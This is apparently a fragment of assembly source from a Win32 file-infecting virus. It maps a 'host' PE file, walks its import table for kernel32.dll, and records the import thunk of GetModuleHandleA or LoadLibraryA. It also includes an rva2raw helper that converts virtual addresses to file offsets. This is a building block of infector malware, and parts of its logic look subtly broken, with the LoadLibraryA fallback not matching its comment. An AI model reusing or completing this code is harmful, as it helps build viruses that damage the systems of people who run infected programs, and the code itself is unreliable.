DEBUGOFF
;scan host import table for GetModuleHandleA(), or LoadLibraryA()

scan_import_table:
       pushad

       mov edi,[fmap]
       mov esi,[peheader]

       mov ebx,[esi.NT_OptionalHeader.OH_ImageBase]
       mov eax,[esi.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
       call rva2raw
       test eax,eax
       jz @@error

       mov ebp,eax
  @@next_import:
       mov eax,[edi.ebp.ID_Name]
       call rva2raw
       test eax,eax
       jz @@error
       mov ecx,[edi.eax]
       or ecx, 20202020h
       sub ecx,"nrek"
       jnz @@next
       mov [GMH], ecx
       add ecx,[edi.eax+4]
       or ecx, 00002020h
       sub ecx,"23le"
       jz @@found
  @@next:
       add ebp, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
       jmp @@next_import

  @@found:
       mov edx,[edi.ebp.ID_FirstThunk]
       mov eax,[edi.ebp.ID_OriginalFirstThunk]
       test eax,eax
       jnz @@has_hint                   ;if dont have hint and list, use
       mov eax,edx                      ;list for everything...
  @@has_hint:
       call rva2raw
       test eax,eax
       jz @@error

       lea esi,[eax+edi]
       add edx,ebx
  @@next_api:
       lodsd
       test eax,eax
       jz @@error
       bt eax,31
       jc @@check_next
       call rva2raw
       test eax,eax
       jz @@error
       cmp [eax+edi+2],"MteG"
       je @@ch_GetModuleHandleA
       cmp [eax+edi+2],"daoL"
       je @@ch_LoadLibraryA
  @@check_next:
       add edx,4
       jmp @@next_api

  @@ch_GetModuleHandleA:
       cmp [eax+edi+2+4],"ludo"
       jne @@check_next
       cmp [eax+edi+2+8],"naHe"
       jne @@check_next
       cmp [eax+edi+2+12],"Aeld"
  @@set_gmh:
       jne @@check_next
       mov [GMH], edx
       jmp @@check_next

  @@ch_LoadLibraryA:
       cmp [eax+edi+2+4],"rbiL"
       jne @@check_next
       cmp [eax+edi+2+8],"Ayra"
       jne @@check_next
       cmp dwo [GMH], 0          ;only use LoadLibraryA if GetModuleHandleA
       jmp @@set_gmh             ;was not found

  @@error:
       popad
       ret

rva2raw:
       pushad
       mov esi,[peheader]
       add esi,size IMAGE_NT_HEADERS
       movzx ecx, wo [esi.NT_FileHeader.FH_NumberOfSections-size IMAGE_NT_HEADERS]
  @@next_section:
       mov ebx, eax
       sub ebx, [esi.SH_VirtualAddress]
       cmp ebx, [esi.SH_VirtualSize]
       mov ecx, [esi.SH_PointerToRawData]
       lea ebx, [ebx+ecx]
       jb @@point_inside
       add esi, IMAGE_SIZEOF_SECTION_HEADER
       loop @@next_section
       sub ebx,ebx
  @@point_inside:
       mov [esp.Pushad_eax], ebx
       popad
       ret

